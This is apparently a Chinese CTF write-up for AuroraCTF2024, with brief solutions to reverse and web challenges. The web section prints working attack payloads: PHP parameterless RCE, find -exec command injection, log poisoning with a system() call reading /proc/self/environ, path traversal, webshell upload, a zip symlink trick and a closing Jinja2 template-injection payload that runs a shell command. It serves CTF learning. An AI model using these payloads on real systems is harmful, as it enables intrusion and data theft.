---
title: AuroraCTF2024
date: 2025-03-13 00:00:00 +0800
categories: [比赛WP, ]
tags: [CTF]
---

## Reverse

------

### [easy]CheckIn

------

拖进IDA直接看到flag。

------



### [easy]溜冰吗?就那种 都是冰的冰块

------

迷宫题，有花指令加密。先把主函数里的花指令都nop掉。

走迷宫的函数里还有花指令，但不影响，记录迷宫地图的数组已经能看到了，整理出迷宫是

 0  0  0  1  0  0  0  1  0  0  0  1  0  0  0  0
 0  0  0  0  0  0  1  0  0  1  0  0  0  0  1  0
 1  0  0  0  0  0  0  0  0  0  0  0  1  0  0  0
 0  0  0  0  0  0  1  0  0  0  0  0  0  0  0  0
 0  0  0  0  0  0  0  0  1  0  0  0  0  0  0  0
 1  0  0  0  0  0  0  1  0  0  0  0  1  0  0  0
 0  0  0  0  0  1  0  0  0  0  0  0  0  0  0  1
 0  0  0  0  0  1  0  0  0  0  0  0  0  0  0  0
 0  1  0  0  0  0  0  1  0  0  0  0  0  0  0  0
 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  1
 0  0  0  0  1  0  0  0  0  0  0  0  0  0  0  0
 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
 0  0  0  0  0  0  0  0  0  1  0  0  0  0  0  0
 0  0  0  1  1  0  0  0  1 15  0  0  0  0  0  0
 0  0  0  0  0  0  0  0  0  1  0  0  0  1  0  1
 0  1  0  0  0  0  0  0  0  0  0  0  0  0  0  0

SDSASDSDWASA这样走

------



### [middle-hard]EZencrypto

------

RC4加密，动调出flag。

------



## web

------

### [easy easy easy] realsignin

------

截断抓包改成大于100万

?popularity=1000001

------



### [easy easy]Array!

------

数组整型溢出绕过赋值，32位最大是2147483647，64位最大是9223372036854775807

?index=9223372036854775807

------



### [easy]Login

------

弱口令登陆admin admin123

请求头中添加user-agent:Aurora，X-Forwarded-For:127.0.0.1

------



### [middle] ezRCE

------

无参数rce，payload：?passwd&var=print_r(scandir(pos(localeconv())));

发现当前目录的flag ?passwd&var=show_source(array_rand(array_flip(scandir(pos(localeconv())))));

------



### [middle]Admin Panel I

------

根据src源码，请求头里cookie写user=admin找到flag

<img src="assets/img/2024/1/image-20240321221607839.png" alt="image-20240321221607839" style="zoom:50%;" />

------



### [medium]寻找宝藏

------

spell1[]=1&spell2[]=2&ans=2e4

![image-20240322130202964](assets/img/2024/1/image-20240322130202964.png)

访问findsth.php

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if (isset($_GET['file'])) {
    $cmd = "find ".$_GET['file'];
    if (!preg_match("/;|&|\r|\n|\||\*|!|<|>|`|\?|:|\(|{|ls|cat|flag/m", substr($_GET['file'], 0, -1))) {
        system($cmd);
    } else {
        echo "DONT HACK ME!";
    }
}
```

一开始是想直接get file传指令，根目录里找到flag所在的文件夹

![image-20240322130518309](assets/img/2024/1/image-20240322130518309.png)

发现cat不出flag<img src="assets/img/2024/1/image-20240322130906469.png" alt="image-20240322130906469" style="zoom: 50%;" />

后来看wp是要用find exec把命令注入的方式绕过。

find命令执行：find '1.txt' -exec command \;

'/etc/passwd' -exec ca\t /fl4444ggg/fl\ag \;

<img src="assets/img/2024/1/image-20240322131334541.png" alt="image-20240322131334541" style="zoom:50%;" />

------



### [middle]include what???

------

日志注入<img src="assets/img/2024/1/image-20240322132049024.png" alt="image-20240322132049024" style="zoom:50%;" />题目介绍说用的是nignx日志

![image-20240322135823023](assets/img/2024/1/image-20240322135823023.png)

蚁剑连接，打开虚拟终端

![image-20240322135919614](assets/img/2024/1/image-20240322135919614.png)

wp是另一种做法，在user-agent里直接cat /proc/self/environ就好了。<?php system('cat /proc/self/environ');?>

------



### [middle-hard]ezUpload

------

![image-20240322152953768](assets/img/2024/1/image-20240322152953768.png)

页面源代码中发现download.php能下载文件

?file=/../../../../../../../var/www/html/index.php

?file=/../../../../../../../var/www/html/download.php

download.php

```php
<?php
// 获取传入的file参数
$file = $_GET['file'];

// 设置文件路径
$file_path = 'uploads/' . $file;

// 检查文件是否存在
if (file_exists($file_path)) {
    // 设置下载的文件名
    header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
    // 设置文件类型
    header('Content-Type: application/octet-stream');
    // 读取文件并输出给浏览器
    readfile($file_path);
} else {
    // 文件不存在时的处理
    echo '文件不存在';
}
?>
```

index.php

```php+HTML
<?php
// 检查是否有POST请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 检查用户名和密码
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username === 'admin' && $password === 'This_is_STROng_P@sswd') {
        if (isset($_FILES['file'])) {
            $file_name = $_FILES['file']['name'];
            $file_tmp = $_FILES['file']['tmp_name'];
            move_uploaded_file($file_tmp, '/var/www/html/uploads/' . $file_name);
            chmod('/var/www/html/uploads/' . $file_name, 0755);
            echo '文件上传成功';
        } else {
            echo '请选择要上传的文件';
        }
    } else {
        echo '用户名或密码错误，无法上传文件';
    }
}

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件上传和下载</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f4f4f4;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        form {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"],
        input[type="password"],
        input[type="file"],
        input[type="submit"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        .file-list {
            margin-top: 20px;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .file-item {
            margin-bottom: 10px;
        }
        a {
            text-decoration: none;
            color: #007bff;
        }
    </style>
</head>
<body>
    <h1>文件上传和下载</h1>
    <form method="post" enctype="multipart/form-data">
        <label for="username">用户名:</label>
        <input type="text" name="username" id="username"><br>
        <label for="password">密码:</label>
        <input type="password" name="password" id="password"><br>
        <input type="file" name="file"><br>
        <input type="submit" value="上传文件">
    </form>
    <div class="file-list">
        <h2>上传文件列表</h2>
        <?php
        $files = array_diff(scandir('uploads/'), array('..', '.'));
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                echo '<div class="file-item">' . $file . ' <a href="download.php?file=' . urlencode($file) . '">下载</a></div>';
            }
        }
        ?>
    </div>
</body>
</html>

```

得到密码，直接传shell，然后蚁剑访问就好了，根据download.php和index.php，文件在 /uploads 下

![image-20240322154222110](assets/img/2024/1/image-20240322154222110.png)

------



### [medium]ezPath

------

页面问你啥服务，这个时候一般可以在报头找到Server这一栏<img src="assets/img/2024/1/image-20240322160455648.png" alt="image-20240322160455648" style="zoom: 67%;" />

用的是aiohttp 3.8.6

漏洞在static路径穿越/static/../../../../../flag

![image-20240322160932054](assets/img/2024/1/image-20240322160932054.png)

------



### [hard]middleupload

------

共用一个密码：This_is_STROng_P@sswd

构造软链接，在linux系统terminal里输入命令：ln -s var/www/html test

压缩文件：zip --symlinks test1.zip test（--symlinks表示压缩软连接）

上传压缩文件后解压。

到windows上，放一个test文件夹，然后在文件夹里放shell，再一起压 缩，叫test2，上传压缩文件后解压。

<img src="assets/img/2024/1/image-20240323130648014.png" alt="image-20240323130648014" style="zoom:67%;" />

------



{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
